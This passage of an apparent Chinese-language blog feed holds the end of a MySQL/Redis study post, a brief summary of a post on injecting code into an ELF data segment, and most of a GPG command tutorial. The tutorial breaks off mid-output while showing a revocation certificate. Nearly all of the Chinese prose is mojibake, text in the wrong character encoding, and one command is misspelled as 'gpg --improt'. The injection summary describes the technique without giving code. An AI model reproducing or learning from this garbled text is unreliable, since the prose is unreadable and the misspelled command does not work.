ä¸ª demoï¼Œäº‰å–è®©å‚ä¸åˆ†äº«çš„åŒå­¦å·©å›ºä¸€ä¸‹æ•°æ®åº“è¿™å—çš„çŸ¥è¯†ã€‚</p><p>ç„¶åå°±æ˜¯è‡ªå·±çš„è¡¨è¾¾èƒ½åŠ›éœ€è¦æå‡æå‡ï¼Œè¿™ä¹Ÿæ˜¯æˆ‘å†™è¿™ä¸¤ç¯‡åšå®¢çš„ç›®çš„ï¼Œå¸Œæœ›è‡ªå·±èƒ½åœ¨æ€»ç»“å’Œå†™ä½œä¸­ï¼Œé”»ç‚¼è‡ªå·±çš„è¡¨è¾¾èƒ½åŠ›ã€‚</p><p>æœ€åè¿˜æ˜¯è°ˆè°ˆæˆ‘å¯¹ MySQL &amp; Redis å­¦ä¹ çš„çœ‹æ³•ï¼Œæˆ‘æ€»ç»“çš„åªæ˜¯éƒ¨åˆ†çŸ¥è¯†ç‚¹ï¼ŒMySQL &amp; Redis çš„ç†è®ºçŸ¥è¯†ç‚¹åå¤šï¼Œéœ€è¦è®°å¿†çš„å†…å®¹ä¹Ÿå¾ˆå¤šã€‚å¹¶ä¸”åœ¨ä¸ªäººé¡¹ç›®æˆ–è€…ä¸éœ€è¦é«˜å¹¶å‘çš„é¡¹ç›®ä¸­ï¼Œå¾ˆå¤šå†…å®¹éƒ½ç”¨ä¸ä¸Šï¼Œç”¨çš„æœ€å¤šçš„è¿˜æ˜¯ CRUDã€‚å› æ­¤æˆ‘è®¤ä¸ºç†Ÿç»ƒåœ° CRUD è¿˜æ˜¯å¾ˆé‡è¦çš„ï¼Œæ¯•ç«Ÿæ˜¯å„ç§é¡¹ç›®çš„åŸºç¡€ã€‚å¦‚æœè¦æƒ³æé«˜è‡ªå·±çš„èƒ½åŠ›ï¼Œå¯¹äºé«˜é˜¶çš„çŸ¥è¯†ç‚¹è¿˜æ˜¯è¯¥è®°è®°è¯¥èƒŒèƒŒï¼Œæ›´åŠ é‡è¦çš„æ˜¯å†™ demoï¼Œç”¨ä»£ç å®æˆ˜è¿‡ã€‚  </p>]]></content>
        <author>
            <name><![CDATA[é£çš„ä¸ªäººç½‘ç«™]]></name>
        </author>
    </entry>
    
    <entry>
        <id>http://blog.qrzbing.cn/post/data-infector/</id>
        <title><![CDATA[data æ®µä»£ç æ³¨å…¥]]></title>
        <updated>2020-04-18T21:29:16+08:00</updated>
        <link href="http://blog.qrzbing.cn/post/data-infector/"/>
        <content type="text/html" src="http://blog.qrzbing.cn/post/data-infector/"><![CDATA[<p>æˆ‘ä»¬å¯ä»¥é€šè¿‡å‘ data æ®µåŠ«æŒä»£ç å¹¶å°†ç¨‹åºçš„è¿è¡ŒæµåŠ«æŒåˆ°è¿™é‡Œå®ç°æˆ‘ä»¬å¸Œæœ›çš„åŠŸèƒ½ï¼ˆåŒ…æ‹¬æ‰§è¡Œæ¶æ„ä»£ç ã€è½¯ä»¶ä¿æŠ¤ç­‰ï¼‰ã€‚è¿™ä¸€è¿‡ç¨‹ä¸­å¯èƒ½æ˜¯æœ€å¤æ‚ä¹Ÿæ˜¯æœ€é‡è¦çš„éƒ¨åˆ†å°±æ˜¯æ€æ ·å°†æ–°å¢çš„ä»£ç æ³¨å…¥åˆ° data æ®µä¸­äº†ã€‚</p>]]></content>
        <author>
            <name><![CDATA[QRZâ€™s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.creedowl.com/posts/gpg/</id>
        <title><![CDATA[GPGä½¿ç”¨ç¬”è®°]]></title>
        <updated>2020-04-02T06:47:31+08:00</updated>
        <link href="https://blog.creedowl.com/posts/gpg/"/>
        <content type="text/html" src="https://blog.creedowl.com/posts/gpg/"><![CDATA[<h2 id="why-gpg">Why GPG?</h2>
<p><a href="https://zh.wikipedia.org/wiki/GnuPG">GPG</a> æ˜¯ä¸€ä¸ªå¯†ç å­¦è½¯ä»¶ï¼Œç”¨äºåŠ å¯†ã€ç­¾åé€šä¿¡å†…å®¹åŠç®¡ç†éå¯¹ç§°å¯†ç å­¦çš„å¯†é’¥ï¼Œå…·ä½“å†å²ã€ä»‹ç»å¯ä»¥åœ¨wikiä¸­çœ‹åˆ°ï¼Œ<a href="https://gnupg.org/">å®˜ç½‘</a></p>
<p>è€Œæˆ‘ä½¿ç”¨ GPG çš„ç¼˜ç”±æ˜¯ï¼Œåœ¨ Github ä¸Šæäº¤æ—¶ï¼Œå¦‚æœä½¿ç”¨ GPG å¯¹æäº¤è¿›è¡Œç­¾åï¼Œä¼šæœ‰ä¸€ä¸ª<code>Verified</code>æ ‡è¯†<del>çœ‹èµ·æ¥å¾ˆnb</del></p>
<p><img src="https://blog-1251984664.cos.ap-shanghai.myqcloud.com/UTOOLS1585795152275.png/compress" alt="UTOOLS1585795152275.png"></p>
<p>å½“ç„¶ä½¿ç”¨ GPG ä¸ä»…æ˜¯ä¸ºäº†å¥½çœ‹ï¼Œå®ƒèƒ½ç¡®ä¿ä½ æä¾›çš„ä¿¡æ¯æ˜¯ç”±ä½ è‡ªå·±å‘å¸ƒçš„ï¼Œæ— æ³•è¢«åˆ«äººç¯¡æ”¹ã€å†’å……ï¼Œå‰ææ˜¯ä¿æŠ¤å¥½è‡ªå·±çš„ GPG ç§é’¥</p>
<h2 id="å®‰è£…">å®‰è£…</h2>
<p>è¿™è¾¹ä»¥ MacOS ä¸ºç¤ºä¾‹è¿›è¡Œæ“ä½œ</p>
<p><strong>å¼ºçƒˆå»ºè®® MacOS ç”¨æˆ·ä½¿ç”¨ <a href="https://gpgtools.org/">GPG Suite</a> è¿›è¡Œæ“ä½œï¼Œå¯ä»¥é¿å…ä¸€äº›å¥‡å¥‡æ€ªæ€ªçš„é—®é¢˜</strong></p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">brew cask install gpg-suite
</code></pre></div><p><del>ä»…å®‰è£… GPG æœ¬ä½“</del></p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell"><span class="c1"># deprecated</span>
brew install gpg
</code></pre></div><h2 id="ç”Ÿæˆå¯†é’¥">ç”Ÿæˆå¯†é’¥</h2>
<p>GPG é‡‡ç”¨éå¯¹ç§°åŠ å¯†ï¼Œä¸€åˆ‡çš„æ“ä½œéƒ½éœ€è¦æœ‰å¯†é’¥ã€‚ç½‘ä¸Šä¸€äº›æ•™ç¨‹ä¸­çš„æ“ä½œä¸æˆ‘ä½¿ç”¨çš„ GPG ç‰ˆæœ¬ <code>gpg (GnuPG/MacGPG2) 2.2.17</code> æœ‰ç‚¹å‡ºå…¥ï¼Œä»¥ä¸‹æ“ä½œéƒ½åœ¨æˆ‘æ‰€ä½¿ç”¨çš„ç‰ˆæœ¬ä¸‹è¿›è¡Œ</p>
<p>æœ‰ä¸¤ä¸ªå‘½ä»¤ç”¨äºç”Ÿæˆå¯†é’¥ï¼Œä¸º<code>gpg --gen-key</code>å’Œ<code>gpg --full-gen-key</code>ï¼ŒåŒºåˆ«æ˜¯å‰è€…é‡‡ç”¨é»˜è®¤çš„é…ç½®ä¸å¯æ›´æ”¹ï¼Œåè€…èƒ½è‡ªå®šä¹‰é…ç½®ã€‚æˆ‘ä»¬é‡‡ç”¨åä¸€ç§ï¼Œé¦–å…ˆé€‰æ‹©å¯†é’¥ç±»å‹ï¼Œé»˜è®¤çš„<code>1</code>å°±å¯ä»¥äº†</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">$ gpg --full-gen-key
gpg <span class="o">(</span>GnuPG/MacGPG2<span class="o">)</span> 2.2.17<span class="p">;</span> Copyright <span class="o">(</span>C<span class="o">)</span> <span class="m">2019</span> Free Software Foundation, Inc.
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

è¯·é€‰æ‹©æ‚¨è¦ä½¿ç”¨çš„å¯†é’¥ç±»å‹ï¼š
   <span class="o">(</span>1<span class="o">)</span> RSA å’Œ RSA ï¼ˆé»˜è®¤ï¼‰
   <span class="o">(</span>2<span class="o">)</span> DSA å’Œ Elgamal
   <span class="o">(</span>3<span class="o">)</span> DSAï¼ˆä»…ç”¨äºç­¾åï¼‰
   <span class="o">(</span>4<span class="o">)</span> RSAï¼ˆä»…ç”¨äºç­¾åï¼‰
æ‚¨çš„é€‰æ‹©æ˜¯ï¼Ÿ <span class="m">1</span>
</code></pre></div><p>æ¥ç€é€‰æ‹©å¯†é’¥é•¿åº¦ï¼Œé»˜è®¤<code>2048</code>å³å¯</p>
<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">RSA å¯†é’¥çš„é•¿åº¦åº”åœ¨ 1024 ä½ä¸ 4096 ä½ä¹‹é—´ã€‚
æ‚¨æƒ³è¦ä½¿ç”¨çš„å¯†é’¥é•¿åº¦ï¼Ÿ(2048) 2048
</code></pre></div><p>ç„¶åè®¾å®šå¯†é’¥çš„æœ‰æ•ˆæœŸé™ï¼Œæˆ‘ä»¬æ²¡æœ‰ç‰¹æ®Šéœ€æ±‚ï¼Œè®¾ç½®æ°¸ä¸è¿‡æœŸå³å¯</p>
<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">è¯·è®¾å®šè¿™ä¸ªå¯†é’¥çš„æœ‰æ•ˆæœŸé™ã€‚
         0 = å¯†é’¥æ°¸ä¸è¿‡æœŸ
      &lt;n&gt;  = å¯†é’¥åœ¨ n å¤©åè¿‡æœŸ
      &lt;n&gt;w = å¯†é’¥åœ¨ n å‘¨åè¿‡æœŸ
      &lt;n&gt;m = å¯†é’¥åœ¨ n æœˆåè¿‡æœŸ
      &lt;n&gt;y = å¯†é’¥åœ¨ n å¹´åè¿‡æœŸ
å¯†é’¥çš„æœ‰æ•ˆæœŸé™æ˜¯ï¼Ÿ(0) 0
</code></pre></div><p>ç¡®è®¤ä¸Šè¿°è®¾ç½®åï¼Œä¾æ¬¡è¾“å…¥å§“åã€é‚®ç®±å’Œæ³¨é‡Šï¼Œè¿™é‡Œæˆ‘ä½¿ç”¨éšæœºä¿¡æ¯ç”¨äºæ¼”ç¤º</p>
<pre><code>GnuPG éœ€è¦æ„å»ºç”¨æˆ·æ ‡è¯†ä»¥è¾¨è®¤æ‚¨çš„å¯†é’¥ã€‚

çœŸå®å§“åï¼š naive
ç”µå­é‚®ä»¶åœ°å€ï¼š naive@test.com
æ³¨é‡Šï¼š too young too simple
æ‚¨é€‰å®šäº†æ­¤ç”¨æˆ·æ ‡è¯†ï¼š
    â€œnaive (too young too simple) &lt;naive@test.com&gt;â€

æ›´æ”¹å§“åï¼ˆNï¼‰ã€æ³¨é‡Šï¼ˆCï¼‰ã€ç”µå­é‚®ä»¶åœ°å€ï¼ˆEï¼‰æˆ–ç¡®å®šï¼ˆOï¼‰/é€€å‡ºï¼ˆQï¼‰ï¼Ÿ
</code></pre>
<p>ç¡®å®šåï¼Œéœ€è¦è®¾å®šå¯†é’¥çš„å¯†ç ï¼Œå¦‚æœä½ é‡‡ç”¨äº† <code>GPG Suite</code> ï¼Œä¼šå‡ºç°ä¸€ä¸ªçª—å£ï¼Œåœ¨æ­¤è¾“å…¥å¯†ç </p>
<p><img src="https://blog-1251984664.cos.ap-shanghai.myqcloud.com/UTOOLS1585796741624.png/compress" alt="UTOOLS1585796741624.png"></p>
<p>å¦‚æœæ²¡ä½¿ç”¨<code>GPG Suite</code>ï¼Œåˆ™ä¼šåœ¨ä½ å½“å‰ç»ˆç«¯å¼¹å‡ºä¸€ä¸ªå…¨å±ç»ˆç«¯çª—å£ï¼ŒåŒæ ·æ˜¯è¾“å…¥å¯†ç ã€‚</p>
<blockquote>
<p>æ³¨æ„ï¼Œåœ¨ mac ç»ˆç«¯ç¯å¢ƒä¸‹ï¼Œå¦‚æœè¯­è¨€æ˜¯ä¸­æ–‡çš„è¯ï¼Œè¿™ä¸ªç»ˆç«¯çª—å£å¯èƒ½ä¼šä¹±ç ï¼Œä½†ä¸å½±å“ä½¿ç”¨ï¼Œä¹Ÿå¯ä»¥ä¸´æ—¶è®¾ç½®è¯­è¨€ä¸ºè‹±æ–‡è§£å†³è¿™ä¸ªé—®é¢˜<code>LANGUAGE=en gpg --full-generate-key</code>ã€‚ä½†åƒä¸‡ä¸è¦ç”¨<code>ctrl-c</code>ç»“æŸè¿™ä¸ªè¿›ç¨‹ï¼Œè¿™ä¼šç ´åå½“å‰ç»ˆç«¯ç¯å¢ƒï¼Œåé¢çš„è¾“å…¥ä¼šå˜å¾—å¾ˆå¥‡æ€ªï¼Œè€Œä¸”åå°è¿›ç¨‹ä¸ä¼šç»“æŸï¼Œä¼šå æ»¡ä½ çš„CPU</p>
</blockquote>
<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">æˆ‘ä»¬éœ€è¦ç”Ÿæˆå¤§é‡çš„éšæœºå­—èŠ‚ã€‚åœ¨è´¨æ•°ç”ŸæˆæœŸé—´åšäº›å…¶ä»–æ“ä½œï¼ˆæ•²æ‰“é”®ç›˜
ã€ç§»åŠ¨é¼ æ ‡ã€è¯»å†™ç¡¬ç›˜ä¹‹ç±»çš„ï¼‰å°†ä¼šæ˜¯ä¸€ä¸ªä¸é”™çš„ä¸»æ„ï¼›è¿™ä¼šè®©éšæœºæ•°
å‘ç”Ÿå™¨æœ‰æ›´å¥½çš„æœºä¼šè·å¾—è¶³å¤Ÿçš„ç†µã€‚
gpg: å¯†é’¥ 4C26D2E451FFDAF1 è¢«æ ‡è®°ä¸ºç»å¯¹ä¿¡ä»»
gpg: ç›®å½•â€˜/Users/creedowl/.gnupg/openpgp-revocs.dâ€™å·²åˆ›å»º
gpg: åŠé”€è¯ä¹¦å·²è¢«å­˜å‚¨ä¸ºâ€˜/Users/creedowl/.gnupg/openpgp-revocs.d/0B3C52F1EF07B14EA7C45C9A4C26D2E451FFDAF1.revâ€™
å…¬é’¥å’Œç§é’¥å·²ç»ç”Ÿæˆå¹¶è¢«ç­¾åã€‚

pub   rsa2048 2020-04-02 [SC]
      0B3C52F1EF07B14EA7C45C9A4C26D2E451FFDAF1
uid                      naive (too young too simple) &lt;naive@test.com&gt;
sub   rsa2048 2020-04-02 [E]
</code></pre></div><p>è¿™æ ·ï¼Œå¯†é’¥å°±ç”Ÿæˆå®Œæˆï¼Œå…¶ä¸­<code>4C26D2E451FFDAF1</code>å°±æ˜¯ä½ çš„å¯†é’¥åï¼Œåç»­æ“ä½œéƒ½éœ€è¦é€šè¿‡è¿™ä¸ªå¯†é’¥åé€‰æ‹©å¯†é’¥ï¼Œä½†ä¹Ÿå¯ä»¥é€šè¿‡ä¹‹å‰è®¾ç½®çš„å§“åæˆ–é‚®ç®±ä»£æ›¿æ“ä½œ</p>
<h2 id="gpg-å¸¸ç”¨æ“ä½œ">GPG å¸¸ç”¨æ“ä½œ</h2>
<p>GPG æœ€åŸºç¡€çš„æ“ä½œå°±æ˜¯å¯¹æ–‡ä»¶ç­‰ä¿¡æ¯è¿›è¡ŒåŠ å¯†ã€ç­¾åï¼Œé¦–å…ˆåˆ›å»ºä¸€ä¸ªæµ‹è¯•æ–‡ä»¶<code>test.txt</code></p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell"><span class="nb">echo</span> <span class="nb">test</span> &gt; test.txt
</code></pre></div><h3 id="åŠ å¯†">åŠ å¯†</h3>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">gpg --recipient creedowl --output test.txt.gpg --encrypt test.txt
</code></pre></div><p>å…¶ä¸­<code>--recipient</code>æŒ‡å®šæ¥æ”¶è€…ï¼Œç®€å†™ä¸º<code>-r</code>ï¼Œè®¾å®šæ¥å—è€…æ—¶éœ€è¦ä½ æœ¬åœ°æœ‰æ¥æ”¶è€…çš„<strong>å…¬é’¥</strong>ï¼Œå¯ä»¥ç”¨å¯†é’¥åã€å§“åæˆ–è€…é‚®ç®±è¿›è¡ŒæŒ‡å®šã€‚<code>--output</code>æŒ‡å®šè¾“å‡ºæ–‡ä»¶åï¼Œå¯çœç•¥ã€‚<code>--encrypt</code>æŒ‡å®šå¾…åŠ å¯†çš„æ–‡ä»¶ï¼Œç®€å†™ä¸º<code>-e</code>ã€‚è¿™æ ·åœ¨ä½ å½“å‰ç›®å½•ä¸‹ä¼šç”Ÿæˆä¸€ä¸ª<code>test.txt.gpg</code>å³åŠ å¯†åçš„æ–‡ä»¶ï¼Œä½ å°±å¯ä»¥æŠŠè¿™ä¸ªæ–‡ä»¶å‘é€ç»™æ¥å—è€…ï¼Œä¸å¿…æ‹…å¿ƒæ–‡ä»¶å†…å®¹è¢«ç¬¬ä¸‰æ–¹è¯»å–</p>
<p><strong>æ³¨æ„</strong>è¿™é‡Œç”ŸæˆåŠ å¯†æ–‡ä»¶ä¸ºäºŒè¿›åˆ¶æ ¼å¼ï¼Œæœ‰æ—¶å€™ï¼ˆå¦‚é€šè¿‡é‚®ä»¶å‘é€ï¼‰ä¸ä¾¿äºæ“ä½œï¼Œå¯ä»¥åŠ ä¸Š<code>--armor</code>å‚æ•°ï¼ˆç®€å†™ä¸º<code>-a</code>ï¼‰ç”Ÿæˆæ–‡æœ¬æ ¼å¼çš„å¯†æ–‡ï¼Œå¦‚</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">gpg -r creedowl -ae test.txt
</code></pre></div><p>ç”Ÿæˆçš„åŠ å¯†æ–‡ä»¶ä¸º<code>test.txt.asc</code></p>
<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">-----BEGIN PGP MESSAGE-----

hQEMA9KmvDhAMTGrAQf+KITqx4HTpWsevIEfRFlw5g+jt8l8ol3fuww0gBoMEPBG
KaqxCmjIpHZdGmaXwBSKadmeieZGLsm1CYuf4gbv4FpdWgveVWnLvB/HmwuvnmJt
YhTtapNgkQ++mwPbH4WKeOFQ58U5dZ7C+R8rrucRRYQBRTH6AJQY82aV1KXTqyF1
D8c/2ANW7aCWr8W/ogCbEqH47VE3foP+aSD+JMPtdnaYWIPzyr5x5lw6ASwxD4hB
ikOUcJTxp+GyFLTd3n1zCvSP9ZQzvolur7soqZVP8t4hxlALGL+KYN4YgubcPt5y
bucMYWkbLlZM+AuAYzSCLaSmkgkiYUFEkwKJWdLr+NJGAY5Mk+bnEP2k/kKxl9vo
/LVsloiYbg9M184LxUNfZRBnKcI9vKw/C6uU2Ee5wKUMsy3Epnp60Fe5u5fj5yn7
0JjMBmY+gQ==
=8K/i
-----END PGP MESSAGE-----
</code></pre></div><h3 id="è§£å¯†">è§£å¯†</h3>
<p>æœ‰äº†å¯†æ–‡å°±è¦å¯¹å…¶è¿›è¡Œè§£å¯†å¾—åˆ°åŸæ–‡ã€‚æ³¨æ„è¦è¿›è¡Œè§£å¯†ï¼Œä½ å¿…é¡»æœ‰æ¥å—è€…çš„<strong>ç§é’¥</strong>ã€‚å…¬é’¥æ˜¯å…¬å¼€çš„ï¼Œä»»ä½•äººéƒ½å¯ä»¥æŸ¥çœ‹ã€ä½¿ç”¨ï¼Œè€Œ<strong>ç§é’¥</strong>æ˜¯ç§æœ‰çš„ï¼Œä¸€å®šè¦ä¿ç®¡å¥½ï¼Œå¦‚æœæ³„éœ²äº†è¿™ä¸ª GPG å¯†é’¥å°±ç­‰åŒäºå¤±æ•ˆäº†ï¼Œéœ€è¦åŠé”€ã€‚è¿™å°±æ˜¯éå¯¹ç§°åŠ å¯†</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">	gpg --decrypt test.txt.asc --output out.txt
</code></pre></div><p>å…¶ä¸­<code>--decrypt</code>å£°æ˜è¯¥å‘½ä»¤è¿›è¡Œè§£å¯†ï¼Œç®€å†™ä¸º<code>-d</code>ï¼Œ<code>--output</code>æŒ‡å®šè¾“å‡ºæ–‡ä»¶ï¼Œé»˜è®¤è¾“å‡ºåˆ°ç»ˆç«¯ã€‚æ³¨æ„è§£å¯†æ—¶éœ€è¦è¾“å…¥ä½ å¯†é’¥çš„å¯†ç ï¼Œæ‰€ä»¥ä¹Ÿä¸€å®šè¦ä¿ç®¡å¥½å¯†ç </p>
<h3 id="ç­¾å">ç­¾å</h3>
<p>æœ‰çš„æ—¶å€™ä¸éœ€è¦å¯¹æ–‡ä»¶è¿›è¡Œç­¾åï¼Œåªéœ€è¦ç¡®ä¿æ–‡ä»¶æ˜¯ç”±æœ¬äººå‘å‡ºçš„ï¼Œè¿™ä¸ªæ—¶å€™å°±å¯ä»¥ç”¨åˆ°ç­¾å</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">gpg --sign test.txt
</code></pre></div><p>ä¼šç”ŸæˆäºŒè¿›åˆ¶çš„ç­¾åæ–‡ä»¶<code>test.txt.gpg</code>ï¼Œå¦‚æœæƒ³ç”Ÿæˆæ–‡æœ¬ç±»å‹çš„ç­¾åï¼Œä½¿ç”¨</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">gpg --clearsign test.txt
</code></pre></div><p>ä¼šç”Ÿæˆæ–‡æœ¬ç±»å‹çš„ç­¾åæ–‡ä»¶<code>test.txt.asc</code></p>
<p>æ³¨æ„ä»¥ä¸Šä¸¤ç§æ–¹å¼åŸæ–‡å’Œç­¾åæ˜¯åœ¨åŒä¸€ä¸ªæ–‡ä»¶ä¸­ï¼ŒæŸ¥çœ‹<code>test.txt.asc</code></p>
<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA256

test
-----BEGIN PGP SIGNATURE-----

iQFDBAEBCAAtFiEECzxS8e8HsU6nxFyaTCbS5FH/2vEFAl6FX+cPHG5haXZlQHRl
c3QuY29tAAoJEEwm0uRR/9rxGNsH/AmjJiT19q5caq9Pe8tMRnR2yvZIGWbMD3Ch
UTkyGMkSPMIo6XRpYPlANe2/dddBT2l7EAPy2lAxaa8LcjsxtRhJG4GxMaCcujik
M6MX3IOfa1m9aDP1IY3Sh2U07j3t+8dawahR8EUF2D+rtvx24ybnwpWpKbDVsGyp
Mt06BI3pWC3opMRYPCl21IBhPhaPPnvXF7X8DMP+2VqZye2juX2oG1KMkZWQuiBb
/D7DYlx6/ainu0cJw6UL8YXHag7tkUeKtTPQbBpCsszOuxJZ74gduIUzDcokayCB
DM9qB/GpUyVOOTwfLMBta6JP5BO8ppPaPdPX46kKDqLKG7eh4bQ=
=Q4/W
-----END PGP SIGNATURE-----
</code></pre></div><p>å› ä¸ºæ˜¯ç­¾åï¼Œä¸ä¼šå¯¹å†…å®¹è¿›è¡ŒåŠ å¯†ï¼Œæ‰€ä»¥ç›´æ¥æ˜¾ç¤ºåŸæ–‡ã€‚å¦‚æœæƒ³æŠŠåŸå§‹æ–‡ä»¶åˆ†ç¦»å‡ºæ¥ï¼Œä½¿ç”¨</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">gpg --output out.txt -d test.txt.gpg
</code></pre></div><p>åˆ†ç¦»çš„åŒæ—¶è¿˜é¡ºä¾¿æ ¡éªŒäº†ç­¾åã€‚æ³¨æ„è¿™é‡Œ<code>test.txt.gpg</code>æ˜¯ä¸Šé¢ç”Ÿæˆçš„äºŒè¿›åˆ¶<strong>ç­¾å</strong>æ–‡ä»¶ï¼Œä¹Ÿå¯ä»¥ç”¨<code>test.txt.asc</code></p>
<p>å¦‚æœæ¯æ¬¡éƒ½è¦åˆ†ç¦»ï¼Œå°±å¾ˆéº»çƒ¦ï¼Œè€Œä¸”æ²¡æœ‰å®‰è£… GPG çš„ç”¨æˆ·å°±æ— æ³•ä½¿ç”¨æºæ–‡ä»¶äº†ã€‚æ‰€ä»¥æ›´å¥½çš„æ–¹å¼æ˜¯åˆ†ç¦»æºæ–‡ä»¶å’Œç­¾åæ–‡ä»¶</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">gpg --detach-sign --armor test.txt
</code></pre></div><p>è¿™æ ·ä¼šç”Ÿæˆä¸€ä¸ªå•ç‹¬çš„ã€æ–‡æœ¬ç±»å‹çš„ç­¾åæ–‡ä»¶<code>test.txt.sig</code></p>
<blockquote>
<p>æ³¨æ„ï¼šå¦‚æœæœ‰å¤šä¸ªç§é’¥ï¼Œå¯ä»¥ç”¨<code>-u</code>å‚æ•°é€‰æ‹©</p>
</blockquote>
<h3 id="ç­¾åæ ¡éªŒ">ç­¾åæ ¡éªŒ</h3>
<p>æ”¶åˆ°æ–‡ä»¶å’Œç­¾åæ–‡ä»¶åï¼Œéœ€è¦å¯¹ç­¾åè¿›è¡Œæ ¡éªŒ</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">gpg --verify test.txt.sig test.txt
</code></pre></div><p>å¦‚æœç­¾åæ ¡éªŒæˆåŠŸï¼Œä¼šæ˜¾ç¤º</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">gpg: ç­¾åå»ºç«‹äº å››  4/ <span class="m">2</span> 11:49:35 <span class="m">2020</span> CST
gpg:               ä½¿ç”¨ RSA å¯†é’¥ 34B368EFC6FA8941B4A096CFFA4C884FBE8164D7
gpg: å®Œå¥½çš„ç­¾åï¼Œæ¥è‡ªäº â€œcreedowl &lt;creedowl@gmail.com&gt;â€ <span class="o">[</span>ç»å¯¹<span class="o">]</span>
</code></pre></div><h3 id="å¯¼å…¥å¯¼å‡º">å¯¼å…¥å¯¼å‡º</h3>
<p>å½“ä½ éœ€è¦ä¸ä»–äººäº¤æ¢æ•°æ®æ—¶ï¼Œéœ€è¦å¯¼å‡ºè‡ªå·±çš„å…¬é’¥ï¼ŒåŒæ—¶å¯¼å…¥ä»–äººçš„å…¬é’¥ï¼›è€Œå¦‚æœä½ æ›´æ¢ç”µè„‘ï¼Œå°±éœ€è¦å¯¼å‡ºè‡ªå·±çš„ç§é’¥ã€‚è¿™å°±æ¶‰åŠåˆ°äº†å¯†é’¥çš„å¯¼å…¥å¯¼å‡º</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">gpg -a --output public_key.txt --export naive
</code></pre></div><p>ä¸Šè¿°å‘½ä»¤ç”¨äºå¯¼å‡ºå…¬é’¥ï¼Œç›¸å…³å‚æ•°åœ¨ä¸Šæ–‡éƒ½æœ‰ä»‹ç»ã€‚æ¥ç€ä½ å°±å¯ä»¥æŠŠ<code>public_key.txt</code>å‘å¸ƒç»™ä»–äºº</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">gpg -a --output private_key.txt --export-secret-keys naive
</code></pre></div><p>ä¸Šè¿°å‘½ä»¤ç”¨äºå¯¼å‡ºç§é’¥ï¼Œä¸€å®šè¦ä¿ç®¡å¥½ï¼Œå»ºè®®åœ¨è„±æœºæƒ…å†µä¸‹è¿›è¡Œæ“ä½œ</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">gpg --improt <span class="o">[</span>å¯†é’¥æ–‡ä»¶<span class="o">]</span>
</code></pre></div><p>ä¸Šè¿°å‘½ä»¤ç”¨äºå¯¼å…¥å¯†é’¥ï¼Œä¸åŒºåˆ†å…¬é’¥ç§é’¥</p>
<h3 id="æŸ¥çœ‹æ‰€æœ‰å¯†é’¥">æŸ¥çœ‹æ‰€æœ‰å¯†é’¥</h3>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">gpg -k
</code></pre></div><h3 id="ç”ŸæˆåŠé”€è¯ä¹¦">ç”ŸæˆåŠé”€è¯ä¹¦</h3>
<p>å½“ä½ çš„ç§é’¥æ³„éœ²æˆ–è€…æ›´æ¢æ—¶ï¼Œéœ€è¦åŠé”€å¤±æ•ˆçš„å¯†é’¥ï¼Œè¿™æ—¶å°±éœ€è¦ä½¿ç”¨åŠé”€è¯ä¹¦</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">gpg --gen-revoke naive
</code></pre></div><p>æ¥ç€é€‰æ‹©åŠé”€åŸå› ï¼Œå°±èƒ½ç”ŸæˆåŠé”€è¯ä¹¦</p>
<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">sec  rsa2048/4C26D2E451FFDAF1 2020-04-02 naive (too young too simple) &lt;naive@test.com&gt;

è¦ä¸ºè¿™ä¸ªå¯†é’¥åˆ›å»ºä¸€ä¸ªåŠé”€è¯ä¹¦å—ï¼Ÿ(y/N) y
è¯·é€‰æ‹©åŠé”€çš„åŸå› ï¼š
  0 = æœªæŒ‡å®šåŸå› 
  1 = å¯†é’¥å·²æ³„æ¼
  2 = å¯†é’¥è¢«æ›¿æ¢
  3 = å¯†é’¥ä¸å†ä½¿ç”¨
  Q = å–æ¶ˆ
ï¼ˆä¹Ÿè®¸æ‚¨ä¼šæƒ³è¦åœ¨è¿™é‡Œé€‰æ‹© 1ï¼‰
æ‚¨çš„å†³å®šæ˜¯ä»€ä¹ˆï¼Ÿ 1
è¯·è¾“å…¥æè¿°ï¼ˆå¯é€‰ï¼‰ï¼›ä»¥ç©ºç™½è¡Œç»“æŸï¼š
&gt;
åŠé”€åŸå› ï¼šå¯†é’¥å·²æ³„æ¼
ï¼ˆæœªç»™å®šæè¿°ï¼‰
è¿™æ ·å¯ä»¥å—ï¼Ÿ (y/N) y
å·²å¼ºè¡Œä½¿ç”¨ ASCII å­—ç¬¦å°è£…è¿‡çš„è¾“å‡ºã€‚
-----BEGIN PGP PUBLIC KEY BLOCK-----
Comment: This is a revocation certificate

****
-----END PGP PUBLIC KEY BLOCK-----
å·²åˆ›å»ºåŠé”€è¯ä¹¦ã€‚

è¯·æŠŠè¿™ä¸ªæ–‡ä»¶è½¬ç§»åˆ°ä¸€ä¸ªæ‚¨å¯ä»¥è—èµ·æ¥çš„ä»‹è´¨ä¸Šï¼›å¦‚æœåäººè·å–åˆ°äº†è¿™
